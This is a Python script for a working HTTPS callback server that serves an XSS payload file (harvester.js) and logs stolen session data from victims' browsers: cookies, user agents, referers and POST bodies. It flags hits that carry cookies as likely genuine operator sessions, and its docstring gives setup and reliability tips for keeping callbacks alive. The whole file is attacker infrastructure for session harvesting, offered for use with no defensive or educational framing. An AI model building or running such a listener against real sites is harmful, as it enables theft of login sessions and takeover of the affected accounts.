#!/usr/bin/env python3
"""HTTPS hook for XSS session harvest: serves the payload route and logs every callback.

Setup:
  - edit PORT / CERT / KEY / PAYLOAD_FILE
  - kill any stale listener on the port first (a leftover server on :443 blocks yours)
  - run: python3 https_hook_listener.py

Design notes (keep these):
  - TLS is wrapped PER-CONNECTION inside the handler thread. Never wrap the listening
    socket: one non-handshaking scanner would stall the accept queue and kill all callbacks.
  - Every hit is appended as a JSON line; 'real' marks likely genuine operator hits
    (cookie present, or our XD=/FIRE= markers).
"""
import http.server, socketserver, ssl, json, os, datetime

PORT = 443
CERT = "/etc/letsencrypt/live/<IP>.sslip.io/fullchain.pem"
KEY = "/etc/letsencrypt/live/<IP>.sslip.io/privkey.pem"
PAYLOAD_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "harvester.js")
LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hits.log")


def now():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    timeout = 20

    def setup(self):
        self.request.settimeout(self.timeout)
        self.request = CTX.wrap_socket(self.request, server_side=True)
        super().setup()

    def _log(self, method, body=b""):
        rec = {"t": now(), "ip": self.client_address[0], "method": method, "path": self.path,
               "ua": self.headers.get("User-Agent", ""), "cookie": self.headers.get("Cookie", ""),
               "referer": self.headers.get("Referer", ""), "blen": len(body),
               "body": body.decode("utf-8", "ignore")[:4000]}
        rec["real"] = bool(rec["cookie"]) or ("XD=" in self.path) or ("FIRE" in self.path)
        with open(LOG, "a") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        print(("\U0001F4A5 " if rec["real"] else "\u00b7 ") + json.dumps(rec, ensure_ascii=False)[:400], flush=True)

    def do_GET(self):
        if self.path.startswith("/x.js"):
            try:
                b = open(PAYLOAD_FILE, "rb").read()
            except Exception:
                b = b"/* payload missing */"
            ct = "application/javascript"
        else:
            b, ct = b"ok", "image/gif"
        self._log("GET")
        self.send_response(200)
        self.send_header("Content-Type", ct)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_POST(self):
        ln = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(ln) if ln else b""
        self._log("POST", body)
        r = b'{"ok":1}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(r)))
        self.end_headers()
        self.wfile.write(r)

    def log_message(self, *a):
        pass


class S(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True
    request_queue_size = 256


CTX = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
CTX.load_cert_chain(CERT, KEY)
with S(("0.0.0.0", PORT), H) as httpd:
    print(f"[+] HTTPS hook on :{PORT} -> {LOG}", flush=True)
    httpd.serve_forever()
